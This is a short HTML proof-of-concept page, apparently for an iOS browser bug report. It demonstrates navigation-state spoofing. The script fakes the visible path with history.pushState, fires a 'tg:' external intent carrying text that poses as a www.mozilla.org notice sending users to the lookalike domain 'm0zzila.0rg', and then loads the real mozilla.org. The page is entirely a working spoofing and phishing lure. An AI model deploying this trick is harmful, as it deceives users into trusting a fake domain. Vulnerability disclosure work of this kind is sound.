<!doctype html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>iOS External Intent Navigation State PoC</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
    }
    iframe {
      width: 100%;
      height: 420px;
      border: 1px solid #ccc;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<button id="test">Trigger mailto intent</button>

<!-- iframe langsung ada -->


<script>
document.getElementById('test').onclick = () => {

  // Step 1: change visible URL
  history.pushState({}, '', '/expected-path');

  // Step 2: trigger external intent
  setTimeout(() => {
    location.href = 'tg:www.mozilla.org says:                    mozilla under maintenance                go to m0zzila.0rg';
  }, 300);

  // Step 3: delayed navigation after intent
  setTimeout(() => {
    location.href = 'https://www.mozilla.org';
  }, 700);
};
</script>

</body>
</html>
